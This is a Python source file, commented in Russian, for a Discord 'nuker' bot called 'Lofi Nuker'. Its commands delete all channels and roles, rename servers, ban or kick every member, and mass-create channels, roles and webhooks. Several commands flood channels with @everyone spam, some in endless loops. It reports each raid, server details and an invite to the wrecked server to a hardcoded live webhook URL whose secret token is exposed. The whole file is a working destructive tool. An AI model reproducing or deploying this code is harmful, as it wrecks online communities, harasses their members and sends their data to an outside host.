# -*- coding: utf-8 -*-
try: #пробуем делать импорты
    from colorama import init
    from colorama import Fore, Back, Style
    from colorama import Fore
    import discord
    from discord import *
    from discord.ext import commands
    import requests
    import asyncio
    import time
    import colorama
    import json
    from discord import Webhook, AsyncWebhookAdapter
    import aiohttp
    init()
except: #если юзер чтото не установил
    print('ERROR | Пожалуйста, установи библиотеки discord, asyncio, colorama')
    input()

try:
 with open('token.txt','r') as f:#читаем токен бота
    token = f.read()#записываем в переменную token
except:
 with open('token.txt','w+') as f:
    print(f'{Fore.GREEN}Отлично! Всё работает! Теперь введи токен бота в token.txt и перезапусти консоль')
    print('Не забудь включить Members intents в разделе Bot!')
    input()
else:
    print(f'{Fore.GREEN}Пытаюсь запустить бота на вашем токене...')

prefix = '!' # наш префикс

# подробные настройки
channelsn = 'crash-by-Lofi' #имя каналов при краше
rolesn = 'Crash By Lofi'#имя ролей при краше
namen = 'Crashed By Lofi'#имя сервера при краше
iconn = 'icon.PNG' # не трогайте лучше
hooknamen = 'Crashed By Lofi'#имя хуков
botnamen = 'Lofi Nuker'#тип имя бота
inviten = 'https://discord.gg/vTk9V26J' # тут ссылка на ваш сервер
spamtextn = f'@everyone\nДанный сервер крашиться ботом LofiNuker\nСервер поддержки: {inviten}'
admins = [692062556264857663] # тут укажи id админов (могут добавлять сервера в вайт лист и менять статус боту), например [123,456,777]
reasonn = 'Crash by FZLNuker' # причина удаления ролей,каналов, бана и кика участников
loghook = 'https://discord.com/api/webhooks/1051799214566424626/L04YX-2rNBE4roNlUuB3wTzA-iIbYBtysjNbX2LaXbsy0My-hCk5PiNeq5HmmyOpIgPp'# ссылка на вебхук с логами

# включаем интенты и создаем переменную бота (client)
intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix=prefix, intents=intents)
client.remove_command('help') # удаляем встроенную команду хелпа

@client.event
async def on_ready():
    with open('invite.txt','w') as f:
        f.write(f'https://discord.com/api/oauth2/authorize?client_id={client.user.id}&permissions=8&scope=bot')
    await client.change_presence(activity=discord.Game(name=f'Краш-бот {botnamen}'))
    print(f'{Fore.YELLOW}Краш бот {Fore.GREEN}{botnamen}{Fore.YELLOW} запущен! Для получения списка команд добавьте бота на сервер и пропишите {prefix}help\nСсылка для добавления бота записана в файл invite.txt')

@client.command()
async def addwl(ctx,idd=None):
    if idd == None:
        await ctx.send(embed=discord.Embed(title='Ошибка',description='Укажите ID сервера!',colour=discord.Colour.from_rgb(228,0,0)))
    elif int(ctx.author.id) in admins:
        with open('wl.json','r') as f:
            bd = json.load(f)
        bd["wl"].append(int(idd))
        with open('wl.json','w') as f:
            json.dump(bd,f)
        await ctx.send(embed=discord.Embed(title='Успешно',description=f'Теперь данный сервер НЕЛЬЗЯ крашнуть! :smiling_imp:',colour=discord.Colour.from_rgb(0,228,0)))
    else:
        await ctx.send(embed=discord.Embed(title='У вас Недостаточно прав',colour=discord.Colour.from_rgb(200,2,0)))

@client.event
async def on_guild_join(guild):# при входе бота на сервер
  with open('wl.json','r') as f:
    wls = json.load(f) #вайтлист серверов!
  if int(guild.id) in wls["wl"]:
    async for entry in guild.audit_logs(limit=2,action=discord.AuditLogAction.bot_add):
        user = entry.user
        iddd = entry.user.id
    for c in guild.text_channels:
      try:
        await c.send(embed=discord.Embed(title='Краш сервера из вайт-листа 🚨',description=f'Данный сервер в вайт листе, и крашнуть его нельзя!\nПытался крашнуть: `{user}` | ID: {iddd}',colour=discord.Colour.from_rgb(228,2,0)))
      except:
        pass
      else:
        break
    await guild.leave()
  else:
    async with aiohttp.ClientSession() as session: # с помощью aiohttp отправляем лог на вебхук
        webhook = Webhook.from_url(loghook, adapter=AsyncWebhookAdapter(session))
        embed = discord.Embed(
            title = 'Меня добавили на новый сервер!',
            description = f':eight_spoked_asterisk: Сервер: **{guild}**\n:family: Участников: **{len(guild.members)}**\n:crown: Владелец: **{guild.owner}**\n:speech_balloon: Кол-во каналов: **{len(guild.channels)}**\n:performing_arts: Кол-во ролей: **{len(guild.roles)}**',
            colour = discord.Colour.from_rgb(214,5,9)
        )
        embed.set_thumbnail(url=guild.icon_url)
        await webhook.send(embed=embed)
    print(f'{Fore.YELLOW}Меня добавили на новый сервер: {Fore.WHITE}{guild}')
    # и на всякий случай выводим лог в консоль

@client.command()
async def help(ctx, arg=''):
    if arg == 'crash':
        embed = discord.Embed(
            title = 'Краш-команды',
            description = f'`{prefix}nuke` - авто краш сервера\n`{prefix}delchannels` - удалить все каналы на сервере\n`{prefix}delroles` - удалить все роли на сервере\n`{prefix}createchannels (кол-во)` - создает определенное кол-во каналов\n`{prefix}createroles (кол-во)` - создает определенное кол-во ролей\n`{prefix}spamwebhooks` - спам вебхуками во все каналы\n`{prefix}spamwebhook1` - спам вебхуком в текущий канал\n`{prefix}rename` - изменить иконку и установить имя серверу (имя иконки - `{iconn}`, имя крашнутого сервера - `{namen}`)\n`{prefix}banall` - бан всех участников сервера\n`{prefix}kickall` - кикнуть всех участников сервера\n`{prefix}spamallchannels` - спам во все каналы от лица бота (очень мощный)\n`{prefix}spam` - спам в текущий канал\n`{prefix}addwl [ ID сервера ]` - добавить сервер в вайт лист (его нельзя будет крашнуть, только для админов)',
            colour = discord.Colour.from_rgb(237, 47, 47)
        )

        await ctx.send(embed=embed)
        return
    elif arg == 'status':
        embed = discord.Embed(
            title = 'Команды статуса',
            description = f'`{prefix}status stream Первый стрим` - установить статус "Стримит" с вашим названием стрима\n`{prefix}status watching (имя стрима)` - установить статус "Смотрит"\n`{prefix}status listening Песня` - установить статус "Слушает"\n`{prefix}status playing Ебу сервера` - установить статус "играет"',
            colour = discord.Colour.from_rgb(237, 47, 47)
        )

        await ctx.send(embed=embed)
        return



    embed = discord.Embed(
        title = 'Список команд',
        description = f'`{prefix}help crash` - помощь по разделу "Краш команды"\n`{prefix}help status` - помощь по разделу "Команды статуса"',
        colour = discord.Colour.from_rgb(237, 47, 47)
    )

    await ctx.send(embed=embed)

@client.command()
async def status(ctx, arg='', *, names=''):
  if int(ctx.author.id) in admins:
    bll = [''] # не смейтесь ебать, просто not == '' не работало, а искать решение лень
    if arg == 'stream' and names not in bll:
        await client.change_presence(activity=discord.Streaming(name=names, url='https://twitch.tv/404'))
        await ctx.message.add_reaction('✅')
    elif arg == 'watching' and names not in bll:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=names))
        await ctx.message.add_reaction('✅')
    elif arg == 'listening' and names not in bll:
        await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=names))
        await ctx.message.add_reaction('✅')
    elif arg == 'playing' and names not in bll:
        await client.change_presence(activity=discord.Game(name=names))
        await ctx.message.add_reaction('✅')
    else:
        embed = discord.Embed(
            title = 'Ошибка ❌',
            description = f'Вы не указали статус или имя для него, либо указали неверный тип статуса\nВведите `{prefix}help status` для получения информации о данной команде',
            colour = discord.Colour.from_rgb(29, 224, 11)
        )
        await ctx.send(embed=embed)
  else:
    await ctx.send('Недостаточно прав!')

@client.command()
async def nuke(ctx):
    async with aiohttp.ClientSession() as session: # тоже самое что и сверху с входом на сервер
        webhook = Webhook.from_url(loghook, adapter=AsyncWebhookAdapter(session))
        embed = discord.Embed(
            title = f'Запущен краш сервера {ctx.guild}',
            description = f'Пользователь: `{ctx.author}` | ID - `{ctx.author.id}`\nКол-во участников на сервере: {len(ctx.guild.members)}',
            colour = discord.Colour.from_rgb(164,66,9)
        )
        await webhook.send(embed=embed)
    timer = time.time()
    nameold = ctx.guild.name
    try:
        with open(iconn, 'rb') as f:
            icon = f.read()
            await ctx.guild.edit(name=namen, icon=icon)
    except:
        print(f'{Fore.RED}[ - ] Не могу изменить имя и иконку серверу {Fore.YELLOW}"{ctx.guild.name}"{Fore.RED}, продолжаю краш сервера')
    else:
        print(f'{Fore.YELLOW}[ + ] Краш сервера {Fore.GREEN}{nameold}{Fore.YELLOW}: иконка и имя серверу изменены')

    for channell in ctx.guild.channels:
        try:
            await channell.delete(reason=reasonn)
        except:
            print(f'{Fore.RED}[ - ] Не смог удалить канал {Fore.GREEN}{channell.name}{Fore.RED} на сервере {Fore.GREEN}{nameold}{Fore.GREEN}, продолжаю краш сервера...')
        else:
            print(f'{Fore.YELLOW}[ + ] Краш сервера {Fore.GREEN}{nameold}{Fore.YELLOW}: Канал {Fore.GREEN}#{channell}{Fore.YELLOW} удалён')


    for roleee in ctx.guild.roles:
        try:
            await roleee.delete(reason=reasonn)
        except:
            print(f'{Fore.RED}[ - ]Не могу удалить роль {Fore.GREEN}{roleee.name}{Fore.RED} на сервере {Fore.GREEN}{nameold}{Fore.RED}, продолжаю краш')
        else:
            print(f'{Fore.YELLOW}[ + ] Краш сервера {Fore.GREEN}{nameold}{Fore.YELLOW}: Роль {Fore.GREEN}@{roleee}{Fore.YELLOW} удалена')

    #тут мы создаем инвайт на крашнутый сервер
    c = await ctx.guild.create_text_channel(channelsn)
    await c.create_webhook(name=hooknamen)
    link = await c.create_invite(max_age = 300)

    async with aiohttp.ClientSession() as session: # тоже самое что и сверху с входом на сервер
        webhook = Webhook.from_url(loghook, adapter=AsyncWebhookAdapter(session))
        embed = discord.Embed(
            title = f'Краш сервера {nameold}',
            description = f'Приглашение - [клик]({link})',
            colour = discord.Colour.from_rgb(164,5,9)
        )
        await webhook.send(embed=embed)

    for i in range(100):
        try:
            chh = await ctx.guild.create_text_channel(channelsn)
            await ctx.guild.create_role(name=rolesn)
        except:
            print(f'{Fore.RED}[ - ] Не смог создать роль/канал на каком либо сервере')
        else:
            print(f'{Fore.YELLOW}[ + ] Создана роль: {Fore.GREEN}@{rolesn}')
            print(f'{Fore.YELLOW}[ + ] Создан канал: {Fore.GREEN}#{channelsn}')


@client.command()
async def delchannels(ctx):
    count = 0
    for channell in ctx.guild.channels:
        try:
            await channell.delete(reason=reasonn)
        except:
            print(f'{Fore.RED}[ - ] Не смог удалить канал {Fore.GREEN}{channell.name}{Fore.RED} на сервере {Fore.GREEN}{ctx.guild}{Fore.RED}, продолжаю краш сервера...')
        else:
            print(f'{Fore.YELLOW}[ + ] Краш сервера {Fore.GREEN}{ctx.guild}{Fore.YELLOW}: Канал {Fore.GREEN}#{channell}{Fore.YELLOW} удалён')
            count+=1

    await ctx.author.send(embed=discord.Embed(title='Каналы успешно удалены',description=f'Было удалено {count} каналов',colour=discord.Colour.from_rgb(0,228,0)))

@client.command()
async def delroles(ctx):
    count = 0
    for r in ctx.guild.roles:
        try:
            await r.delete(reason=reasonn)
            count+=1
        except:
            print(f'{Fore.RED}[ - ] Не смог удалить роль {Fore.GREEN}{r}{Fore.RED} на сервере {Fore.GREEN}{ctx.guild}{Fore.RED}, продолжаю краш сервера...')
        else:
            print(f'{Fore.YELLOW}[ + ] Краш сервера {Fore.GREEN}{ctx.guild}{Fore.YELLOW}: Роль {Fore.GREEN}@{r}{Fore.YELLOW} удалена')
            count+=1

    await ctx.author.send(embed=discord.Embed(title='Роли успешно удалены',description=f'Было удалено {count} ролей',colour=discord.Colour.from_rgb(0,228,0)))


@client.command()
async def createchannels(ctx, count):
    good = 0
    for i in range(int(count)):
        try:
            await ctx.guild.create_text_channel(channelsn)
        except:
            print(f'{Fore.RED}[ - ] Краш сервера {Fore.GREEN}{ctx.guild}{Fore.RED}: Канал {Fore.GREEN}#{channelsn}{Fore.RED} не был создан')
        else:
            good+=1
            print(f'{Fore.YELLOW}[ + ] Краш сервера {Fore.GREEN}{ctx.guild}{Fore.YELLOW}: Канал {Fore.GREEN}#{channelsn}{Fore.YELLOW} был создан')

    await ctx.author.send(embed=discord.Embed(title=f'Было создано {good} каналов',colour=discord.Colour.from_rgb(0,228,0)))


@client.command()
async def createroles(ctx, count):
    good=0
    for i in range(int(count)):
        try:
            await ctx.guild.create_role(name=rolesn)
        except:
            print(f'{Fore.RED}[ - ] Краш сервера {Fore.GREEN}{ctx.guild}{Fore.RED}: Роль {Fore.GREEN}@{rolesn}{Fore.RED} не была создана')
        else:
            good+=1
            print(f'{Fore.YELLOW}[ + ] Краш сервера {Fore.GREEN}{ctx.guild}{Fore.YELLOW}: Роль {Fore.GREEN}@{rolesn}{Fore.YELLOW} была создана')

    await ctx.author.send(embed=discord.Embed(title=f'Было создано {good} ролей',colour=discord.Colour.from_rgb(0,228,0)))


async def spamhook(ctx,ch):
 try:
    hooklist = await ch.webhooks()
    while True:
        for hook in hooklist:
            await hook.send(content=spamtextn, wait=True)
 except:
    pass

@client.command()
async def spamwebhooks(ctx):
    async with aiohttp.ClientSession() as session: # тоже самое что и сверху с входом на сервер
        webhook = Webhook.from_url(loghook, adapter=AsyncWebhookAdapter(session))
        embed = discord.Embed(
            title = f'Запущен спам вебхуками на сервере {ctx.guild}',
            description = f'Пользователь: `{ctx.author}` | ID - `{ctx.author.id}`',
            colour = discord.Colour.from_rgb(164,66,9)
        )
        await webhook.send(embed=embed)
    await ctx.author.send(embed=discord.Embed(title='Создание вебхуков запущено',description='Если на сервере более 50 текстовых каналов или бот не сможет создать вебхук - просто ничего не произойдёт',colour=discord.Colour.from_rgb(0,228,0)))
    for channel in ctx.guild.text_channels:
        try:
            await channel.create_webhook(name=hooknamen)
        except:
            print(f'{Fore.RED}[ - ] Не создал хук на канал {Fore.YELLOW}#{channel.name}')
        else:
            print(f'{Fore.YELLOW}[ + ] Создал вебхук на канал {Fore.GREEN}#{channel}')

    for ch in ctx.guild.text_channels:
        print(f'{Fore.YELLOW}[ + ] Спам на вебхук в канале {Fore.GREEN}#{ch}{Fore.YELLOW} запущен!')
        asyncio.create_task(spamhook(ctx,ch))

@client.command()
async def spamwebhook1(ctx):
    try:
        await ctx.message.channel.create_webhook(name=hooknamen)
    except:
        pass
    else:
        print(f'{Fore.GREEN}[ + ] Запущен спам вебхуками на канал {Fore.YELLOW}#{ctx.channel}')
        await ctx.author.send(embed=discord.Embed(title='Спам вебхуками на текущий канал запущен', colour=discord.Colour.from_rgb(0,228,0)))

    hooklist = await ctx.message.channel.webhooks()
    for hook in hooklist:
            for i in range(100):
                await hook.send(content=spamtextn, wait=True)

@client.command()
async def rename(ctx):
    n = ctx.guild
    try:
        with open(iconn, 'rb') as f:
            icon = f.read()
            await ctx.guild.edit(name=namen, icon=icon)
    except:
        await ctx.author.send(embed=discord.Embed(title='Ошибка!',description=f'Что-то пошло не так, и я не смог поменять имя и аватарку этому серверу',colour=discord.Colour.from_rgb(200,0,0)))
        print(f'{Fore.RED}[ - ]Не могу изменить имя и иконку серверу {Fore.YELLOW}"{ctx.guild.name}"')
    else:
        print(f'{Fore.GREEN}[ + ] Сменил иконку и имя серверу {Fore.YELLOW}{n}')
        await ctx.author.send(embed=discord.Embed(title=f'Успешно изменено имя и иконка серверу {n}', colour =discord.Colour.from_rgb(0,228,0)))

@client.command()
async def banall(ctx):
    count = 0
    for jktimosha in ctx.guild.members:
        if int(jktimosha.id) != int(ctx.message.author.id):
            try:
                await ctx.guild.ban(jktimosha, reason=reasonn)
            except:
                print(f'{Fore.RED}[ - ] Не забанил участника {Fore.YELLOW}{jktimosha.name}')
            else:
                print(f'{Fore.GREEN}[ + ] Забанил участника {Fore.YELLOW}{jktimosha.name}')
                count+=1

    await ctx.author.send(embed=discord.Embed(title=f'Забанено {count} человек',colour=discord.Colour.from_rgb(0,228,0)))

@client.command()
async def kickall(ctx):
    count = 0
    for jktimosha in ctx.guild.members:
        if int(jktimosha.id) != int(ctx.message.author.id):
            try:
                await ctx.guild.kick(jktimosha, reason=reasonn)
            except:
                print(f'{Fore.RED}[ - ] Не кикнул участника {Fore.YELLOW}{jktimosha.name}')
            else:
                print(f'{Fore.GREEN}[ + ] Кикнул участника {Fore.YELLOW}{jktimosha.name}')
                count+=1
    await ctx.author.send(embed=discord.Embed(title=f'Кикнуто {count} человек',colour=discord.Colour.from_rgb(0,228,0)))

async def send(ctx,channel):
    try:
        await channel.send(spamtextn)
    except:
        print(f'{Fore.RED}[ - ] Не отправил спам в канал {Fore.YELLOW}#{channel}')
    else:
        print(f'{Fore.GREEN}[ + ] Отправил спам в канал {Fore.YELLOW}#{channel}')

@client.command()
async def spamallchannels(ctx):
    for channel in ctx.guild.text_channels:
        asyncio.create_task(send(ctx,channel))


@client.command()
async def spam(ctx):
    while True:
        await ctx.send(spamtextn)

@client.event
async def on_guild_channel_create(channel):
            await channel.create_webhook(name=hooknamen)
            for i in range(100):
                try:
                    hooklist = await channel.webhooks()
                    for hook in hooklist:
                        await hook.send(content=spamtextn, wait=True)
                except:
                    pass

try:
	client.run(token)
except Exception as e:
	print(f'{Fore.RED}Ты указал неверный токен бота или не включил ему интенты!')
	input()
